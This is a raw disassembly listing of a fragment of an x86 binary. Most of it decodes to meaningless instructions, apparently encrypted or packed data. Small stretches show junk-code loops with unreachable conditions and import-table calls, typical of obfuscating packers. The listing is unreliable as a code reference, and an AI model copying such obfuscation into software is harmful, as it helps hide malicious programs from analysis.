  4071c4:	mov    dh,cl
  4071c6:	adc    edi,DWORD PTR [ebp-0x53]
  4071c9:	add    al,0xb4
  4071cb:	(bad)  
  4071cc:	push   cs
  4071cd:	test   esi,ebp
  4071cf:	mov    dh,0x28
  4071d1:	pop    eax
  4071d2:	xchg   edi,eax
  4071d3:	lea    edi,[ebp+eax*4+0x68742d8d]
  4071da:	or     ebx,edi
  4071dc:	adc    DWORD PTR [ebp-0x44f97a62],0x992ef7b7
  4071e6:	loopne 0x4071d6
  4071e8:	inc    edx
  4071e9:	popf   
  4071ea:	sbb    ch,0x8a
  4071ed:	dec    esi
  4071ee:	add    al,0x4b
  4071f0:	add    ecx,ecx
  4071f2:	pop    edi
  4071f3:	sub    eax,0x223fa276
  4071f8:	cmp    eax,0xe32ecbd0
  4071fd:	inc    edi
  4071fe:	sub    ch,BYTE PTR [ebx]
  407200:	and    ebx,DWORD PTR [edi-0x44]
  407203:	lods   eax,DWORD PTR ds:[esi]
  407204:	aaa    
  407205:	push   esi
  407206:	dec    esp
  407207:	inc    esi
  407208:	inc    edi
  407209:	sbb    BYTE PTR [edi+0x58ab700b],ah
  40720f:	cmp    DWORD PTR ds:0x9fe144b3,ebx
  407215:	bound  esp,QWORD PTR [eax-0x5]
  407218:	ficom  DWORD PTR [edi-0x3fb3d2cc]
  40721e:	ins    DWORD PTR es:[edi],dx
  40721f:	add    esi,DWORD PTR [ecx+edi*4+0x29]
  407223:	sbb    ah,BYTE PTR [esp]
  407226:	ins    BYTE PTR es:[edi],dx
  407227:	cmp    eax,0x70a92d81
  40722c:	test   al,0xb2
  40722e:	dec    ecx
  40722f:	fldcw  WORD PTR [ebp+0x7277a8b7]
  407235:	push   ss
  407236:	cmp    BYTE PTR [edx+0x1],dh
  407239:	mov    al,0x32
  40723b:	jle    0x4071c0
  40723d:	jle    0x40729c
  40723f:	into   
  407240:	ss mov esi,ebp
  407243:	loopne 0x40721c
  407245:	pop    eax
  407246:	mov    dh,0x1a
  407248:	das    
  407249:	jmp    0x4071cb
  40724b:	iret   
  40724c:	call   0xeeb2bbd9
  407251:	inc    ebp
  407252:	mov    esi,0x5d44afa1
  407257:	lods   eax,DWORD PTR ds:[esi]
  407258:	out    dx,eax
  407259:	or     DWORD PTR [bp+di],0xc75ec4c1
  407260:	(bad)
  407264:	and    DWORD PTR [ebx],esi
  407266:	jge    0x40728b
  407268:	mov    edx,ds
  40726a:	repz stc 
  40726c:	xchg   edi,eax
  40726d:	push   ss
  40726e:	xor    al,0x8d
  407270:	daa    
  407271:	adc    eax,0x3818f2fd
  407276:	das    
  407277:	int3   
  407278:	repz cli 
  40727a:	inc    edi
  40727b:	test   al,0xb8
  40727d:	inc    ecx
  40727e:	ins    BYTE PTR es:[edi],dx
  40727f:	in     eax,dx
  407280:	repz xchg esi,eax
  407282:	jns    0x4072c7
  407284:	jo     0x4072ff
  407286:	jmp    0x221:0xc200b6b6
  40728d:	sub    ecx,eax
  40728f:	stc    
  407290:	inc    esi
  407291:	ss cwde 
  407293:	jnp    0x4072e5
  407295:	jp     0x407230
  407297:	and    al,al
  407299:	loopne 0x407234
  40729b:	add    BYTE PTR [ebp+0x617fa30a],al
  4072a1:	inc    esp
  4072a2:	inc    esp
  4072a3:	ins    DWORD PTR es:[edi],dx
  4072a4:	inc    ebx
  4072a5:	cwde   
  4072a6:	mov    bh,0x7b
  4072a8:	lea    esi,[ebp+0x35b2ecd6]
  4072ae:	push   eax
  4072af:	loop   0x4072e2
  4072b1:	retf   
  4072b2:	fistp  QWORD PTR [esi-0x45]
  4072b5:	into   
  4072b6:	pushf  
  4072b7:	pushf  
  4072b8:	adc    BYTE PTR [esi+0x64753ab5],bh
  4072be:	repz mov al,ds:0x167c98bb
  4072c4:	xchg   esi,eax
  4072c5:	sbb    DWORD PTR [edi],edi
  4072c7:	sub    DWORD PTR [ebx+ebp*1+0x633aaa57],ecx
  4072ce:	cmp    ah,BYTE PTR [edi-0x78]
  4072d1:	in     al,dx
  4072d2:	push   ds
  4072d3:	mov    bh,0x5b
  4072d5:	pop    es
  4072d6:	pop    edx
  4072d7:	or     ch,BYTE PTR [ebx+0x5ad40d7]
  4072dd:	xor    BYTE PTR [esi+0x36],dh
  4072e0:	or     al,0x53
  4072e2:	and    al,0x1f
  4072e4:	sbb    cl,0xbe
  4072e7:	shr    BYTE PTR [edx+0x3c86efbe],1
  4072ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072ee:	call   0xd4a7:0x25bf599e
  4072f5:	cmp    dh,dl
  4072f7:	mov    BYTE PTR [eax],cl
  4072f9:	pop    esi
  4072fa:	sub    DWORD PTR [ebp-0x53],esp
  4072fd:	(bad)  
  4072fe:	mov    fs,WORD PTR [edx+0xb]
  407301:	adc    al,0x33
  407303:	xchg   BYTE PTR [edx],ch
  407305:	jbe    0x407382
  407307:	ret    0x76fc
  40730a:	mov    dl,BYTE PTR [esp+esi*1+0x1b]
  40730e:	dec    ecx
  40730f:	push   ebp
  407310:	xlat   BYTE PTR ds:[ebx]
  407311:	dec    ebx
  407312:	xor    BYTE PTR [ecx],ah
  407314:	jno    0x40736c
  407316:	lods   al,BYTE PTR ds:[esi]
  407317:	xor    eax,0x161f3136
  40731c:	inc    ecx
  40731d:	scas   al,BYTE PTR es:[edi]
  40731e:	leave  
  40731f:	lods   eax,DWORD PTR ds:[esi]
  407320:	rcl    bh,cl
  407322:	mov    esi,0xd461850b
  407327:	es dec eax
  407329:	mov    cl,0x2c
  40732b:	pop    ebp
  40732c:	cmp    BYTE PTR [edx+0x4c],bh
  40732f:	jp     0x407397
  407331:	clc    
  407332:	push   cs
  407333:	das    
  407334:	ds push ds
  407336:	push   0xffffffaf
  407338:	push   edx
  407339:	lea    ecx,ds:0x77fbb1db
  40733f:	mov    ebp,0xcb4ae318
  407344:	mov    al,ds:0x7e36ff45
  407349:	cmp    DWORD PTR [esi+0x48],edx
  40734c:	push   eax
  40734d:	mov    ah,0x1
  40734f:	(bad)  
  407350:	jmp    0xf42f:0x33e027f9
  407357:	sbb    DWORD PTR [eax],ecx
  407359:	fcmovb st,st(3)
  40735b:	inc    ebx
  40735c:	mov    al,0x10
  40735e:	ret    
  40735f:	fcomp  QWORD PTR [ebx+esi*1]
  407362:	retf   
  407363:	sbb    edi,DWORD PTR [edx]
  407365:	js     0x40731c
  407367:	scas   eax,DWORD PTR es:[edi]
  407368:	adc    BYTE PTR [ebp+esi*1-0x54bede02],bh
  40736f:	retf   0xf72
  407372:	mov    eax,ds:0xf7085a5c
  407377:	data16 adc al,0x55
  40737a:	and    al,BYTE PTR [edi+0x34a8bf7e]
  407380:	call   0x790b:0x3746e628
  407387:	mov    ebp,gs
  407389:	xlat   BYTE PTR ds:[ebx]
  40738a:	mov    eax,0x7f681dfe
  40738f:	xchg   esp,eax
  407390:	leave  
  407391:	mov    ch,0x5b
  407393:	xchg   ecx,eax
  407394:	mov    ebp,0xba144e29
  407399:	mov    ecx,0x90dbf067
  40739e:	lods   al,BYTE PTR ds:[esi]
  40739f:	push   cs
  4073a0:	inc    ecx
  4073a1:	stos   BYTE PTR es:[edi],al
  4073a2:	sub    BYTE PTR ds:0x9fc96dea,0xc9
  4073a9:	(bad)  
  4073aa:	mov    edi,0x97a564bc
  4073af:	push   edi
  4073b0:	pop    ecx
  4073b1:	jmp    0x407378
  4073b3:	clc    
  4073b4:	call   0xd6874f25
  4073b9:	push   ds
  4073ba:	jmp    0x2bd7:0xa98adbce
  4073c1:	and    DWORD PTR [eax+0x5e],esi
  4073c4:	jle    0x407435
  4073c6:	and    eax,edi
  4073c8:	out    dx,al
  4073c9:	scas   al,BYTE PTR es:[edi]
  4073ca:	imul   BYTE PTR [ebp-0x763f4281]
  4073d0:	aaa    
  4073d1:	pop    edi
  4073d2:	jp     0x4073fe
  4073d4:	in     al,0x39
  4073d6:	call   0x4b4660a3
  4073db:	jnp    0x40737c
  4073dd:	in     al,0x38
  4073df:	lahf   
  4073e0:	mov    al,bl
  4073e2:	inc    edx
  4073e3:	lods   eax,DWORD PTR ds:[esi]
  4073e4:	(bad)  
  4073e5:	scas   eax,DWORD PTR es:[edi]
  4073e6:	ins    BYTE PTR es:[edi],dx
  4073e7:	xlat   BYTE PTR ds:[ebx]
  4073e8:	imul   esi,ecx,0x8f00847
  4073ee:	data16 or bh,BYTE PTR [edx+0x148c071c]
  4073f5:	mov    ch,0xd8
  4073f7:	lods   eax,DWORD PTR ds:[esi]
  4073f8:	ins    BYTE PTR es:[edi],dx
  4073f9:	test   al,0x42
  4073fb:	sub    al,0xd7
  4073fd:	hlt    
  4073fe:	push   esi
  4073ff:	dec    BYTE PTR [edi+edx*4+0x13]
  407403:	xchg   edi,eax
  407404:	push   edi
  407405:	inc    esi
  407406:	ds jne 0x407471
  407409:	or     eax,0xe09c0aef
  40740e:	in     eax,dx
  40740f:	mov    ss,WORD PTR [esi+0x238a5e29]
  407415:	mov    ds:0xff34f9f8,eax
  40741a:	jae    0x40743f
  40741c:	mov    ds:0xc9a104d,eax
  407421:	sbb    DWORD PTR [ebx],ebp
  407423:	or     ebp,DWORD PTR [ebp+0x3b]
  407426:	mul    BYTE PTR [ebp-0x55]
  407429:	(bad)  
  40742a:	fs mov ebx,0x1bb7e3ca
  407430:	pop    edx
  407431:	sbb    DWORD PTR [ecx+0x5c],eax
  407434:	sar    BYTE PTR [ecx-0x46],1
  407437:	mov    ds:0x839c7046,al
  40743c:	cld    
  40743d:	mov    esi,0x1a8a2d4a
  407442:	fiadd  WORD PTR [esi-0x22]
  407445:	stc    
  407446:	dec    ecx
  407447:	cmp    bh,dl
  407449:	sub    eax,0xfe1ad5f7
  40744e:	xchg   edi,eax
  40744f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407450:	lods   eax,DWORD PTR ds:[esi]
  407451:	stc    
  407452:	fs sub al,0x31
  407455:	stos   DWORD PTR es:[di],eax
  407457:	test   BYTE PTR [eax],dh
  407459:	xor    eax,0x75244464
  40745e:	push   ebp
  40745f:	cmp    DWORD PTR [ecx-0x644d6a54],eax
  407465:	inc    ecx
  407466:	push   eax
  407467:	pusha  
  407468:	xchg   ecx,eax
  407469:	fistp  DWORD PTR [eax]
  40746b:	jmp    0xbca17455
  407470:	out    dx,eax
  407471:	lods   eax,DWORD PTR ds:[esi]
  407472:	loopne 0x4074ba
  407474:	or     eax,0x5234e988
  407479:	xchg   edx,eax
  40747a:	or     eax,0xc345222d
  40747f:	mov    edi,0xc753487b
  407484:	add    eax,0x433697
  407489:	pop    ss
  40748a:	add    BYTE PTR [eax],al
  40748c:	add    BYTE PTR [ebx+0x4336973d],al
  407492:	add    BYTE PTR [eax],al
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433697,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433697,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433697
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433697,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433697
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433697,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x4336ab
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x4336ab,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	into   
  407502:	jne    0x407542
  407504:	outs   dx,DWORD PTR ds:[esi]
  407505:	push   esi
  407506:	enter  0x7c7c,0xd7
  40750a:	jns    0x407588
  40750c:	jl     0x407514
  40750e:	jg     0x40758a
  407510:	xor    al,0x8b
  407512:	and    BYTE PTR [ecx+0x1859868f],al
  407518:	push   edx
  407519:	pusha  
  40751a:	out    0x87,al
  40751c:	push   edx
  40751d:	faddp  st(6),st
  40751f:	lods   eax,DWORD PTR ds:[esi]
  407520:	rcr    DWORD PTR [esi-0x39a0121d],cl
  407526:	pop    eax
  407527:	gs out 0x4,eax
  40752a:	sub    BYTE PTR [eax-0x3c],al
  40752d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40752e:	adc    edx,0x37
  407531:	cmp    eax,0x9e7a61af
  407536:	js     0x40759d
  407538:	add    eax,0xffffffd4
  40753b:	or     BYTE PTR [esi+edx*2-0x47afea67],0xab
  407543:	add    eax,0x87abbd61
  407548:	push   ebx
  407549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40754a:	jb     0x407521
  40754c:	iret   
  40754d:	(bad)  
  40754e:	cmp    DWORD PTR [ebp-0x22],ecx
  407551:	mov    bh,BYTE PTR [ecx+esi*2-0x29]
  407555:	jp     0x4075b0
  407557:	cmp    cl,0x9c
  40755a:	pop    ds
  40755b:	into   
  40755c:	push   esi
  40755d:	push   cs
  40755e:	sub    BYTE PTR [ebp+0x16],dh
  407561:	jp     0x4075a7
  407563:	pop    ds
  407564:	mov    dl,0xdb
  407566:	adc    BYTE PTR [ecx-0x1e],0x2e
  40756a:	mov    eax,0x9da7d930
  40756f:	outs   dx,BYTE PTR ds:[esi]
  407570:	sbb    eax,0xd9d4f117
  407575:	and    al,ch
  407577:	push   ss
  407578:	fisub  DWORD PTR [eax]
  40757a:	xor    cl,BYTE PTR [edi-0x325c7961]
  407580:	pop    ecx
  407581:	mov    edx,0x6fddaf54
  407586:	(bad)  
  407588:	dec    edx
  407589:	ret    
  40758a:	sub    edi,edx
  40758c:	ror    BYTE PTR [esi+edi*4-0x23],1
  407590:	call   0xb01b:0x5ffdf94f
  407597:	sub    al,0x6c
  407599:	mov    al,0x33
  40759b:	jo     0x4075d8
  40759d:	mov    ebx,edx
  40759f:	daa    
  4075a0:	jnp    0x40759a
  4075a2:	push   ss
  4075a3:	(bad)  
  4075a4:	xchg   DWORD PTR [edi],esp
  4075a6:	xchg   esi,eax
  4075a7:	inc    edx
  4075a8:	jbe    0x40753b
  4075aa:	das    
  4075ab:	fcom   st(7)
  4075ad:	ds dec edx
  4075af:	mov    BYTE PTR ds:0x6601c664,ch
  4075b5:	jmp    edx
  4075b7:	adc    eax,0xb79a1ec3
  4075bc:	sar    DWORD PTR [ebx-0x55],1
  4075bf:	enter  0x6a21,0xf3
  4075c3:	mov    WORD PTR ds:0x6bcfa06f,gs
  4075c9:	push   ss
  4075ca:	xchg   edx,eax
  4075cb:	mov    eax,0x264221bd
  4075d0:	xor    ecx,esp
  4075d2:	test   BYTE PTR [ebx],ah
  4075d4:	ja     0x4075c1
  4075d6:	pushf  
  4075d7:	mov    edi,0x7e2af67c
  4075dc:	mov    ds:0x72ba8cba,eax
  4075e1:	xor    DWORD PTR [ecx+0x56],0xffffffff
  4075e5:	mov    DWORD PTR [esi*1+0x7486788d],edx
  4075ec:	int3   
  4075ed:	lods   eax,DWORD PTR ds:[esi]
  4075ee:	loope  0x4075e3
  4075f0:	ror    ah,cl
  4075f2:	sub    eax,0x8f4bc147
  4075f7:	je     0x407649
  4075f9:	sahf   
  4075fa:	mov    dh,0x7a
  4075fc:	xor    edi,DWORD PTR [eax+0x4f]
  4075ff:	aaa    
  407600:	and    al,0x90
  407602:	xor    eax,0xb780f303
  407607:	dec    esp
  407608:	popa   
  407609:	jp     0x407640
  40760b:	or     esi,DWORD PTR [ebp+0x460213fa]
  407611:	pop    es
  407612:	fisttp QWORD PTR [eax+0x2a]
  407615:	mov    dh,0x17
  407617:	daa    
  407618:	call   0x7e136d1b
  40761d:	mov    bl,0xd
  40761f:	lds    esi,FWORD PTR [edi+eax*4+0x2ffe8d45]
  407626:	push   esp
  407627:	sbb    eax,0x84dde99
  40762c:	std    
  40762d:	mov    dl,0xfc
  40762f:	inc    edx
  407630:	push   esi
  407631:	je     0x407687
  407633:	pop    edi
  407634:	push   es
  407635:	xchg   ebp,eax
  407636:	ret    
  407637:	fiadd  WORD PTR [esi+0x60041114]
  40763d:	pop    ebp
  40763e:	mov    eax,0xb736bcb9
  407643:	or     cl,bh
  407645:	not    esi
  407647:	dec    edx
  407648:	cld    
  407649:	retf   0xcee8
  40764c:	test   al,0xb7
  40764e:	dec    edx
  40764f:	adc    DWORD PTR [edx+0x45],ecx
  407652:	cli    
  407653:	fdecstp 
  407655:	xor    eax,DWORD PTR [ecx]
  407657:	in     eax,dx
  407658:	push   eax
  407659:	xchg   esp,eax
  40765a:	jmp    0x4075e4
  40765c:	sub    BYTE PTR [ebp-0x18df08a7],bl
  407662:	cmp    eax,0x80aa027d
  407667:	jge    0x4076e5
  407669:	lods   al,BYTE PTR ds:[esi]
  40766a:	pop    eax
  40766b:	in     al,dx
  40766c:	mov    cl,0x90
  40766e:	sbb    eax,0x84aba7c6
  407673:	adc    dh,BYTE PTR [esi+0x7df52f0d]
  407679:	enter  0x4cc5,0x21
  40767d:	xor    al,0xbd
  40767f:	xlat   BYTE PTR ds:[ebx]
  407680:	aaa    
  407681:	ret    
  407682:	dec    ebp
  407683:	in     al,0xd5
  407685:	icebp  
  407686:	lea    esi,[ebx-0x635e12d4]
  40768c:	jb     0x4076d2
  40768e:	sub    eax,DWORD PTR [ecx+0x63e353c7]
  407694:	add    BYTE PTR [edi],0xe
  407697:	xor    BYTE PTR [ecx+eiz*4+0x6],ch
  40769b:	pop    esi
  40769c:	retf   0xee2c
  40769f:	mov    eax,ds:0x5c4727fd
  4076a4:	jne    0x407626
  4076a6:	out    0x5,eax
  4076a8:	wbinvd 
  4076aa:	jne    0x407659
  4076ac:	imul   esp,DWORD PTR [eax],0x87a3c0c2
  4076b2:	pop    es
  4076b3:	out    dx,al
  4076b4:	mov    edx,0xd72cbab3
  4076b9:	mov    eax,ds:0x7cbcf1d
  4076be:	cmc    
  4076bf:	pop    ecx
  4076c0:	hlt    
  4076c1:	cs jl  0x407671
  4076c4:	mov    dh,0xc1
  4076c6:	out    0x95,al
  4076c8:	test   DWORD PTR [edx-0x701d535e],0x8dc58a6f
  4076d2:	stos   BYTE PTR es:[edi],al
  4076d3:	jp     0x4076f4
  4076d5:	add    edx,esp
  4076d7:	ja     0x407718
  4076d9:	ffree  st(1)
  4076db:	sbb    DWORD PTR es:[edi],ebx
  4076de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076df:	and    al,0x93
  4076e1:	dec    esi
  4076e2:	vaddsubpd xmm7,xmm4,xmm7
  4076e6:	into   
  4076e7:	jle    0x4076a8
  4076e9:	stos   BYTE PTR es:[edi],al
  4076ea:	jmp    0x4076c5
  4076ec:	jg     0x4076d1
  4076ee:	pop    ebp
  4076ef:	outs   dx,BYTE PTR ds:[esi]
  4076f0:	push   ds
  4076f1:	jmp    0xbb7a86d3
  4076f6:	clc    
  4076f7:	fwait
  4076f8:	pop    esp
  4076f9:	mov    edi,0xa7a8a495
  4076fe:	pop    edi
  4076ff:	fist   WORD PTR [edi-0x6b]
  407702:	mov    al,ds:0xa98b4e93
  407707:	aad    0xcc
  407709:	imul   eax,DWORD PTR [eax+0x7d],0x9a719c9d
  407710:	xlat   BYTE PTR ds:[ebx]
  407711:	repz stc 
  407713:	add    al,0x56
  407715:	push   ebx
  407716:	std    
  407717:	dec    ebx
  407718:	jmp    0xa95c315
  40771d:	mov    ds:0xb1a8221c,eax
  407722:	push   edx
  407723:	cmp    BYTE PTR [eax+ecx*2+0x6de59c5c],0x1e
  40772b:	gs test al,0xed
  40772e:	daa    
  40772f:	jae    0x4076e5
  407731:	(bad)  
  407732:	loopne 0x4077a0
  407734:	jb     0x4076d9
  407736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407737:	add    al,0x47
  407739:	pop    edi
  40773a:	add    BYTE PTR [edi+ebp*4-0x20],0x17
  40773f:	xchg   DWORD PTR [eax-0x3bd268bb],edx
  407745:	xchg   ecx,eax
  407746:	mov    ah,0xb8
  407748:	popf   
  407749:	jmp    0x6950:0x1482feda
  407750:	xor    eax,0x30879851
  407755:	fbstp  TBYTE PTR [ebx-0x121c2e73]
  40775b:	sub    al,0xcb
  40775d:	aam    0x16
  40775f:	and    DWORD PTR [eax],edi
  407761:	mov    edx,DWORD PTR [ebp-0x563359f4]
  407767:	dec    edi
  407768:	(bad)  
  407769:	jns    0x40775f
  40776b:	and    eax,0x24d38a8b
  407770:	pop    ds
  407771:	sub    eax,0x4b6e95f1
  407776:	sahf   
  407777:	retf   
  407778:	lahf   
  407779:	jmp    0xae833e1e
  40777e:	push   ss
  40777f:	dec    ebp
  407780:	inc    edx
  407781:	(bad)  
  407782:	lds    edi,FWORD PTR [ebx]
  407784:	iret   
  407785:	scas   al,BYTE PTR es:[edi]
  407786:	icebp  
  407787:	jb     0x4077ee
  407789:	rcr    BYTE PTR [edi+0x26943764],1
  40778f:	cli    
  407790:	mov    edi,DWORD PTR [edx]
  407792:	xchg   ebx,eax
  407793:	cmp    DWORD PTR [ebp+0x7f],ecx
  407796:	mov    ds:0x67d52204,eax
  40779b:	sti    
  40779c:	(bad)  
  40779d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40779e:	jl     0x4077b6
  4077a0:	mov    ds:0x2ec1e331,al
  4077a5:	cwde   
  4077a6:	sub    cl,BYTE PTR [eax+0x66]
  4077a9:	pushf  
  4077aa:	xor    eax,ebp
  4077ac:	out    dx,al
  4077ad:	stc    
  4077ae:	sub    DWORD PTR [edi],esi
  4077b0:	loope  0x4077a2
  4077b2:	or     ebp,DWORD PTR [eax-0x2f]
  4077b5:	push   cs
  4077b6:	pop    ds
  4077b7:	ss sbb ecx,edx
  4077ba:	ret    
  4077bb:	add    DWORD PTR [esi-0x3853e718],eax
  4077c1:	and    eax,0xcce819e
  4077c6:	fcomp  DWORD PTR [ebx+0x4184bb76]
  4077cc:	out    0x69,eax
  4077ce:	xlat   BYTE PTR ds:[ebx]
  4077cf:	cmp    eax,0x97dad5c6
  4077d4:	cmp    eax,0x3f5a85b9
  4077d9:	and    al,0xd5
  4077db:	cmp    edx,DWORD PTR ds:[edx-0x1aedc592]
  4077e2:	xlat   BYTE PTR ds:[ebx]
  4077e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077e4:	mov    bl,0x20
  4077e6:	jb     0x407831
  4077e8:	adc    al,0x4c
  4077ea:	(bad)  
  4077eb:	jmp    0x79c30edd
  4077f0:	mov    ds:0xb5d1dcd0,al
  4077f5:	retf   0xaf43
  4077f8:	sub    DWORD PTR [edx+ebp*1],edi
  4077fb:	mov    eax,ds:0x6859f869
  407800:	aad    0x98
  407802:	rol    BYTE PTR [edx+0xb],0x16
  407806:	jecxz  0x407794
  407808:	gs mov dl,0x49
  40780b:	jae    0x40783a
  40780d:	push   0xffffffe7
  40780f:	mov    ecx,0xfb039719
  407814:	push   esp
  407815:	mov    esi,0x6a003041
  40781a:	std    
  40781b:	push   edx
  40781c:	das    
  40781d:	cs call 0x9537:0xd86ecabd
  407825:	ss dec edi
  407827:	jmp    0x543a:0xaec5e1f
  40782e:	les    esi,FWORD PTR [ecx]
  407830:	loop   0x407824
  407832:	dec    eax
  407833:	add    eax,0x8ab034ac
  407838:	or     bh,BYTE PTR [ebp+0x30]
  40783b:	pusha  
  40783c:	or     eax,0xfae5e03d
  407841:	rcl    DWORD PTR [bx+di-0x72af],1
  407846:	mov    ah,0x5d
  407848:	stos   BYTE PTR es:[edi],al
  407849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40784a:	jmp    0x40785d
  40784c:	ret    
  40784d:	(bad)  
  40784e:	out    0x9c,al
  407850:	sbb    edi,DWORD PTR [edx+0x46]
  407853:	and    ebx,DWORD PTR [ebx-0x6c]
  407856:	in     al,0xd6
  407858:	imul   esi,DWORD PTR [ecx+0x61399563],0xcb42de63
  407862:	mov    esp,0x8bf55ec1
  407867:	inc    ebp
  407868:	in     al,0x81
  40786a:	and    eax,0x433717
  40786f:	add    BYTE PTR [eax],al
  407871:	add    BYTE PTR [eax],al
  407873:	mov    ebx,DWORD PTR ds:0x433717
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433717,ebx
  407880:	cmp    DWORD PTR ds:0x433717,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433717,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433717
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433717,ebx
  4078b0:	cmp    DWORD PTR ds:0x433717,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x43364b,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x4336eb,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x4336eb
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x4336eb,edi
  4078e1:	cmp    DWORD PTR ds:0x4336eb,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x4336eb,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433914
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x4336eb,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x4336eb
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x4336eb,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x43364b,0x19
  407943:	cmp    DWORD PTR ds:0x43364b,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x43364b,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x43364b,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x43364b
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x43364b,edi
  407988:	mov    edi,DWORD PTR ds:0x43364b
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x43364b,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x4336ef
  4079a2:	or     edi,DWORD PTR ds:0x433763
  4079a8:	mov    DWORD PTR ds:0x4336ef,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x4336b3,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x4336b3
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x4336b3,esi
  4079cf:	cmp    DWORD PTR ds:0x4336b3,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x4336b3,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     BYTE PTR [eax+0x29bc04c6],dl
  407a4f:	aam    0x7c
  407a51:	jl     0x407a2a
  407a53:	jns    0x407ad1
  407a55:	jl     0x4079fd
  407a57:	jns    0x407a61
  407a59:	and    dh,BYTE PTR [ecx+0x6b]
  407a5c:	mov    ds:0xe8e7c6e2,eax
  407a61:	xor    bh,dl
  407a63:	mov    al,0xae
  407a65:	fs into 
  407a67:	test   BYTE PTR ds:0x117cda21,ah
  407a6d:	mov    ebp,0x379fd695
  407a72:	sub    dh,BYTE PTR [ebp+0x9]
  407a75:	cmp    esi,esi
  407a77:	stc    
  407a78:	loope  0x407a06
  407a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a7b:	(bad)  
  407a7c:	jle    0x407a14
  407a7e:	sub    DWORD PTR [ecx-0x57],0xffffff93
  407a82:	push   cs
  407a83:	mov    cl,BYTE PTR [eax-0x198d0fef]
  407a89:	outs   dx,DWORD PTR ds:[esi]
  407a8a:	dec    esp
  407a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a8c:	mov    WORD PTR [edx],?
  407a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
